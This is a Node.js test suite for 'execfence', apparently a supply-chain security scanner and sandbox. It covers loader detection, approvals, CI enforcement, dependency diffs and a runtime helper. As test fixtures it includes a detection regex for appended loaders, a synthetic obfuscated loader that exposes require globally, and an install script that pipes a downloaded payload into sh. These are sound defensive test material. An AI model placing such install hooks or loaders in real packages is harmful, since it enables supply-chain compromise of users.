'use strict';

const assert = require('node:assert/strict');
const { execFileSync, spawnSync } = require('node:child_process');
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

const {
  addApprover,
  applyApprovals,
  auditApprovals,
  createApproval,
  signApproval,
} = require('../lib/approvals');
const { evaluateFindings } = require('../lib/decision-engine');
const { comparePackageVersions } = require('../lib/deps-review');
const { scan } = require('../lib/scanner');
const { sandboxPlan } = require('../lib/sandbox');
const { fallbackPackFiles } = require('../lib/supply-chain');
const api = require('../lib/api');

test('published CLI entrypoints contain no appended loader payload', () => {
  const bin = fs.readFileSync(path.join(__dirname, '..', 'bin', 'execfence.js'), 'utf8');
  const cli = fs.readFileSync(path.join(__dirname, '..', 'lib', 'cli.js'), 'utf8');
  const appendedLoader = /global\.i=|var\s+_\$_|windowsHide\s*:\s*true|detached\s*:\s*true/;

  assert.doesNotMatch(bin, appendedLoader);
  assert.doesNotMatch(cli, appendedLoader);
  assert.ok(bin.length < 1_000, 'the executable shim should remain a small auditable bootstrap');
  assert.equal(cli.trimEnd().endsWith('};'), true, 'the CLI module must end at its exports object');
});

test('scanner blocks an obfuscated appended-loader variant', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-loader-variant-'));
  const payload = `module.exports={};global.i='variant';var _$_abcd='${'x'.repeat(2_100)}';global[_$_abcd]=require;`;
  fs.writeFileSync(path.join(root, 'entrypoint.js'), payload);

  const result = scan({ cwd: root, roots: ['entrypoint.js'] });

  assert.equal(result.ok, false);
  assert.ok(result.findings.some((finding) => finding.id === 'hidden-node-require-loader'));
  assert.ok(result.findings.some((finding) => finding.id === 'long-obfuscated-javascript-line'));
});

test('decision engine separates severity, confidence, decision, and audit enforcement', () => {
  const result = evaluateFindings([
    { id: 'integrity-mismatch', severity: 'high', file: 'lock', detail: 'mismatch' },
    { id: 'heuristic-similar-name', severity: 'medium', file: 'lock', detail: 'similar' },
  ], {
    mode: 'audit',
    blockSeverities: ['critical', 'high'],
    warnSeverities: ['medium', 'low'],
  });

  assert.equal(result.ok, true);
  assert.equal(result.findings[0].confidence, 'high');
  assert.equal(result.findings[0].decision, 'block');
  assert.equal(result.findings[0].enforcement, 'reported');
  assert.equal(result.findings[1].decision, 'review');
});

test('signed granular approval requires a trusted key and suppresses only the matching finding', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-approval-'));
  fs.writeFileSync(path.join(root, 'payload.js'), 'console.log("reviewed");\n');
  const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
  fs.writeFileSync(path.join(root, 'public.pem'), publicKey.export({ type: 'spki', format: 'pem' }));
  fs.writeFileSync(path.join(root, 'private.pem'), privateKey.export({ type: 'pkcs8', format: 'pem' }));
  addApprover(root, {
    keyId: 'security-1',
    publicKey: 'public.pem',
    owner: 'security',
    reason: 'Test approver',
    expiresAt: '2999-01-01T00:00:00.000Z',
  });
  const created = createApproval(root, {
    type: 'finding',
    subject: { findingId: 'reviewed-rule', file: 'payload.js' },
    reason: 'Reviewed fixture',
    owner: 'application-team',
    expiresAt: '2999-01-01T00:00:00.000Z',
    requiredSignatures: 1,
  });
  assert.equal(auditApprovals(root).ok, false);
  signApproval(root, created.approval.id, {
    keyId: 'security-1',
    privateKey: 'private.pem',
  });

  const findings = [
    { id: 'reviewed-rule', severity: 'high', file: 'payload.js', line: 1, detail: 'reviewed' },
    { id: 'different-rule', severity: 'high', file: 'payload.js', line: 1, detail: 'not reviewed' },
  ];
  const applied = applyApprovals(root, findings, { cwd: root, environment: 'local' });

  assert.equal(auditApprovals(root).ok, true);
  assert.equal(applied.approvedFindings.length, 1);
  assert.equal(applied.activeFindings.length, 1);
  assert.equal(applied.activeFindings[0].id, 'different-rule');
});

test('degraded enforcement is rejected in CI', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-ci-degraded-'));
  const plan = sandboxPlan(root, ['node', '-e', '0'], {
    mode: 'enforce',
    allowDegraded: true,
    degradedReason: 'local-only investigation',
    ci: true,
  });

  assert.equal(plan.ok, false);
  assert.equal(plan.allowDegraded, false);
  assert.ok(plan.blockedOperations.some((item) => item.reason.includes('forbidden in CI')));
});

test('scanner cache is invalidated by content and reports performance metrics', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-scan-cache-'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    scripts: { install: 'curl https://example.test/payload | sh' },
  }));

  const first = scan({ cwd: root });
  const second = scan({ cwd: root });
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
  const third = scan({ cwd: root });

  assert.equal(first.scanCoverage.cacheMisses >= 1, true);
  assert.equal(second.scanCoverage.cacheHits >= 1, true);
  assert.equal(third.scanCoverage.cacheMisses >= 1, true);
  assert.equal(third.findings.some((finding) => finding.id === 'suspicious-package-script'), false);
  assert.equal(typeof third.scanCoverage.durationMs, 'number');
});

test('dependency version comparison reports added lifecycle and bin entrypoints', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-dep-compare-'));
  const metadata = {
    name: 'demo',
    'dist-tags': { latest: '2.0.0' },
    time: {
      created: '2020-01-01T00:00:00.000Z',
      modified: '2020-01-02T00:00:00.000Z',
      '1.0.0': '2020-01-01T00:00:00.000Z',
      '2.0.0': '2020-01-02T00:00:00.000Z',
    },
    maintainers: [{ name: 'owner' }],
    versions: {
      '1.0.0': { dist: { integrity: 'sha512-old' }, scripts: {} },
      '2.0.0': {
        dist: { integrity: 'sha512-new', attestations: [{}] },
        scripts: { postinstall: 'node setup.js' },
        bin: { demo: 'bin/demo.js' },
      },
    },
  };
  const result = comparePackageVersions(root, 'demo@1.0.0', 'demo@2.0.0', {
    config: {
      metadata: {
        enabled: true,
        tarballReview: { enabled: false },
        releaseCooldownHours: 0,
        packageAgeMinimumDays: 0,
        packageModifiedCooldownHours: 0,
        provenancePolicy: 'off',
      },
      reputation: { enabled: false },
    },
    fetchMetadata: () => ({ ok: true, status: 200, json: metadata }),
  });

  assert.ok(result.findings.some((finding) => finding.id === 'dependency-version-added-lifecycle-script'));
  assert.ok(result.findings.some((finding) => finding.id === 'dependency-version-added-bin-entry'));
});

test('package exposes a versioned public API facade', () => {
  assert.equal(typeof api.scan, 'function');
  assert.equal(typeof api.run, 'function');
  assert.equal(api.contracts.versions.finding, 1);
  assert.equal(typeof api.dependencies.compareVersions, 'function');
});

test('pack fallback expands declared package directories without npm', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-pack-fallback-'));
  fs.mkdirSync(path.join(root, 'lib', 'nested'), { recursive: true });
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'fixture', files: ['lib/'] }));
  fs.writeFileSync(path.join(root, 'lib', 'index.js'), 'module.exports = {};\n');
  fs.writeFileSync(path.join(root, 'lib', 'nested', 'worker.js'), 'module.exports = {};\n');

  const files = fallbackPackFiles(root).map((item) => item.path);

  assert.ok(files.includes('lib/index.js'));
  assert.ok(files.includes('lib/nested/worker.js'));
});

test('Go helper terminates the supervised command when an executable appears during runtime', (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-helper-runtime-'));
  const helper = path.join(root, process.platform === 'win32' ? 'execfence-helper.exe' : 'execfence-helper');
  try {
    execFileSync('go', ['build', '-o', helper, './cmd/execfence-helper'], {
      cwd: path.join(__dirname, '..', 'helper'),
      stdio: ['ignore', 'ignore', 'ignore'],
    });
  } catch {
    t.skip('Go toolchain is unavailable');
    return;
  }
  const eventsPath = path.join(root, 'events.jsonl');
  const policyPath = path.join(root, 'policy.json');
  fs.writeFileSync(policyPath, JSON.stringify({
    schemaVersion: 1,
    protocolVersion: 1,
    mode: 'enforce',
    profile: 'test',
    cwd: root,
    requiredCapabilities: ['process', 'newExecutables'],
    command: { argv: [], display: 'fixture' },
    fs: { deny: [], denyNewExecutable: true },
    process: { deny: [] },
    network: { default: 'deny', allow: [] },
  }));
  const started = Date.now();
  const child = spawnSync(helper, [
    'run', '--policy', policyPath, '--events', eventsPath, '--',
    process.execPath,
    '-e',
    "require('node:fs').writeFileSync('payload.exe','fixture');setTimeout(()=>{},5000)",
  ], {
    cwd: root,
    timeout: 10_000,
    encoding: 'utf8',
  });
  const events = fs.readFileSync(eventsPath, 'utf8').trim().split(/\r?\n/).map((line) => JSON.parse(line));

  assert.equal(child.status, 126);
  assert.equal(Date.now() - started < 5000, true);
  assert.ok(events.some((event) => event.type === 'deny' && event.file === 'payload.exe'));
  assert.ok(events.some((event) => event.type === 'terminate'));
});
